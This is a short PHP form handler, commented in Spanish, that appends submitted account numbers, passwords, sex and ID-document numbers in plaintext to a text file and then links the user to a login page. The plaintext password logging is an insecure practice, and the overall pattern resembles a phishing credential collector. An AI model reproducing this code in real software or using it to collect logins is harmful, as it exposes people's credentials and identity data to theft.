<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtener los datos del formulario
    $numero = htmlspecialchars($_POST['numero']);
    $contrasena = htmlspecialchars($_POST['contrasena']);
    $sexo = htmlspecialchars($_POST['sexo']);
    $documento = htmlspecialchars($_POST['documento']);

    // Guardar los datos en un archivo de texto
    $archivo = fopen("datos/datos.txt", "a");
    fwrite($archivo, "Número: $numero\n");
    fwrite($archivo, "Contraseña: $contrasena\n");
    fwrite($archivo, "Sexo: $sexo\n");
    fwrite($archivo, "Número de Documento: $documento\n\n");
    fclose($archivo);

    // Mostrar un mensaje con un enlace de ingreso
    echo "<h1>Gracias por registrarte</h1>";
    echo "<p>Tu registro ha sido exitoso. Haz clic en el siguiente enlace para ingresar:</p>";
    echo "<a href='https://www.ejemplo.com/ingreso'>Ingresar</a>";
} else {
    header("Location: formulario.html");
    exit();
}
?>